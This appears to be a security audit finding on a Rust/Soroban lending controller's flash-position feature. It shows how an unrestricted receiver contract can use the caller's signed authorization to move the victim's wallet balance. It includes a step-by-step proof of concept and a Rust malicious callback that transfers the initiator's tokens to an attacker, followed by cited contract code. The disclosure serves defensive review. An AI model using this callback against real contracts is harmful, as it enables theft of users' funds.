### Title
Unrestricted flash-position receiver can steal caller wallet funds through the signed authorization tree - (File: contracts/controller/src/strategies/flash_position.rs)

### Summary
`Controller.flash_position` authorizes `caller`, accepts any deployed Wasm `receiver`, and invokes that receiver before settlement completes. [1](#0-0)  Because the receiver runs inside the caller-authorized invocation tree, a crafted receiver can add an unrelated token `transfer(caller, attacker, balance)` as a nested authorized call. [2](#0-1) 

### Finding Description
The controller verifies only that `receiver` is Wasm code and is neither the controller nor the pool; it does not allowlist receiver code or constrain the callback’s authorization tree. [3](#0-2)  After minting and forwarding debt, the controller invokes `execute_flash_position` with attacker-controlled `data`, while the original `caller` authorization remains active for the transaction. [4](#0-3) 

A malicious callback can therefore invoke a token contract with `from = caller` and `to = attacker`; transaction simulation will surface that call as an additional child authorization, and signing the generated envelope authorizes it. [5](#0-4) 

### Impact Explanation
A crafted flash-position transaction can drain arbitrary token balances held directly by the victim, beyond the debt and collateral amounts disclosed by the protocol arguments. [6](#0-5)  This is theft of user funds caused by insufficient validation of a caller-supplied callback destination. [7](#0-6) 

### Likelihood Explanation
Exploitation requires the victim to submit or sign a transaction containing the malicious receiver and the expanded authorization tree. [8](#0-7)  The issue remains plausible because the receiver, callback payload, and generated nested authorization can be supplied by an untrusted application rather than constructed by the victim. [3](#0-2) 

### Recommendation
Do not allow arbitrary receiver contracts to execute under an account-owner authorization. [6](#0-5)  Prefer a governance-approved receiver allowlist, or route flash positions through a constrained protocol-owned execution contract that cannot expose the user’s wallet authorization to arbitrary nested calls. [9](#0-8)  At minimum, clients must simulate the complete transaction and reject any authorization child other than the expected token and protocol calls. [10](#0-9) 

### Proof of Concept
1. Deploy a malicious Wasm receiver implementing `execute_flash_position`.
2. In that callback, invoke a wallet-held token as `token.transfer(initiator, attacker, token.balance(initiator))`.
3. Build `Controller.flash_position` with:
   - `caller = victim`
   - `receiver = malicious_contract`
   - a flashloanable `debt`
   - valid `collaterals` sufficient to satisfy the final risk checks
   - attacker-chosen `data`
4. Simulate the transaction so the malicious token transfer appears as an additional authorized sub-invocation.
5. Obtain the victim’s signature on the generated transaction and submit it.
6. The callback transfers the victim’s wallet balance to the attacker while the flash position can still settle normally. [11](#0-10) 

The essential malicious callback is:

```rust
fn execute_flash_position(
    env: Env,
    initiator: Address,
    _account_id: u64,
    _asset: Address,
    _amount: i128,
    _fee: i128,
    amount_received: i128,
    controller: Address,
    data: Bytes,
) {
    let stolen_token: Address = data.try_into().unwrap();
    let token = token::Client::new(&env, &stolen_token);
    let balance = token.balance(&initiator);
    token.transfer(&initiator, &attacker_address(&env), &balance);

    // Return or swap `amount_received` into the declared collateral and
    // transfer enough collateral to `controller` for settlement.
}
```

This succeeds because the controller has already called `caller.require_auth()` and then executes attacker-selected code without restricting nested calls attributable to that authorization. [12](#0-11) [2](#0-1)

### Citations

**File:** contracts/controller/src/strategies/flash_position.rs (L40-90)
```rust
pub(crate) fn process_flash_position(
    env: &Env,
    caller: &Address,
    params: FlashPositionParams<'_>,
) -> u64 {
    require_authorized_caller(env, caller);

    let FlashPositionParams {
        account_id,
        spoke_id,
        mode,
        debt,
        amount,
        receiver,
        data,
        collaterals,
        refund_assets,
    } = params;

    require_positive_amount(env, amount);
    config::require_hub_active(env, debt.hub_id);
    assert_with_error!(
        env,
        matches!(
            mode,
            PositionMode::Multiply | PositionMode::Long | PositionMode::Short
        ),
        CollateralError::InvalidPositionMode
    );
    require_wasm_receiver(env, receiver);

    let controller = env.current_contract_address();
    assert_with_error!(
        env,
        *receiver != controller,
        FlashLoanError::InvalidFlashloanReceiver
    );

    let mut cache = Context::new(env);
    let pool_addr = cache.cached_pool_address();
    assert_with_error!(
        env,
        *receiver != pool_addr,
        FlashLoanError::InvalidFlashloanReceiver
    );
    // Caller-selected receivers require flash loans enabled; multiply uses
    // the configured router and does not require this flag.
    assert_with_error!(
        env,
        cache.cached_pool_sync_data(debt).params.is_flashloanable,
        FlashLoanError::FlashloanNotEnabled
```

**File:** contracts/controller/src/strategies/flash_position.rs (L119-154)
```rust
    // Guard both forwarding and the callback: token hooks can reenter first.
    let (amount_received, collateral_before, refund_before) =
        storage::with_flash_guard(env, || {
            let amount_received =
                mint_and_forward(env, &mut account, debt, amount, receiver, &mut cache);
            // Baselines exclude funding and forwarding; count callback receipts only.
            let collateral_before = snapshot_balances(
                env,
                &controller,
                collaterals.iter().map(|(hub_asset, _)| hub_asset.asset),
            );
            let refund_before = snapshot_balances(env, &controller, refund_assets.iter());
            invoke_receiver(
                env,
                receiver,
                caller,
                account_id,
                &debt.asset,
                amount,
                amount_received,
                &controller,
                data,
            );
            (amount_received, collateral_before, refund_before)
        });

    let deposits = collect_collateral_deposits(env, &controller, collaterals, &collateral_before);
    process_deposit(env, &controller, &mut account, &deposits, &mut cache);

    refund_listed_assets(env, caller, refund_assets, &refund_before);

    // Check before and after finalization: its LTV refresh can prune zero-scaled
    // supply, and persistence removes empty accounts.
    require_flash_position_still_open(env, &account, debt);
    strategy_finalize(env, account_id, &mut account, &mut cache);
    require_flash_position_still_open(env, &account, debt);
```

**File:** contracts/controller/src/strategies/flash_position.rs (L297-322)
```rust
fn invoke_receiver(
    env: &Env,
    receiver: &Address,
    initiator: &Address,
    account_id: u64,
    asset: &Address,
    amount: i128,
    amount_received: i128,
    controller: &Address,
    data: &Bytes,
) {
    env.invoke_contract::<()>(
        receiver,
        &Symbol::new(env, "execute_flash_position"),
        (
            initiator.clone(),
            account_id,
            asset.clone(),
            amount,
            0i128,
            amount_received,
            controller.clone(),
            data.clone(),
        )
            .into_val(env),
    );
```

**File:** common/src/token.rs (L33-51)
```rust
/// Authorizes, on behalf of the current contract, one `transfer(from, to, amount)`
/// call on `token_addr` made deeper in the next contract call (for example by
/// the pool). The entry allows no further sub-invocations.
pub fn authorize_transfer_as_current(
    env: &Env,
    token_addr: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
) {
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
```

**File:** contracts/controller/src/risk/validation.rs (L12-24)
```rust
/// Authenticates `caller` and rejects execution during a flash loan.
pub(crate) fn require_authorized_caller(env: &Env, caller: &Address) {
    caller.require_auth();
    require_not_flash_loaning(env);
}

/// Rejects execution while the temporary flash-loan flag is set.
pub(crate) fn require_not_flash_loaning(env: &Env) {
    assert_with_error!(
        env,
        !storage::is_flash_loan_ongoing(env),
        FlashLoanError::FlashLoanOngoing
    );
```
